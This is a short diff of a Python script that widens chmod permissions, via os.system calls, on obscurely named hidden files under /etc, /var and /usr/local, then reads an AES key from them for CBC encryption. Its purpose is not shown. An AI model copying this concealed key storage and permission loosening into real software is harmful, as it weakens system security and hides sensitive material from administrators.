@@ -46,7 +46,7 @@ import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import *
 
-os.system('chmod u+r /etc/.raulm')
+os.system('chmod u+rw /etc/.raulm')
 key = open('/etc/.raulm/.Ye/.key', 'rb').read()
 os.system('chmod u+rw /var/.Hj /usr/local/.ko')
 with open('/usr/local/.ko/.Yeiv', 'rb') as fi:
@@ -200,7 +200,7 @@ import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import *
 
-os.system('chmod u+r /etc/.raulm/.Ye/.key')
+os.system('chmod u+rw /etc/.raulm/.Ye/.key')
 key = open('/etc/.raulm/.Ye/.key', 'rb').read()
 os.system('chmod u+rw /var/.Hj/.Yerws /usr/local/.ko/.Yeiv')
 cipher = AES.new(key, AES.MODE_CBC)
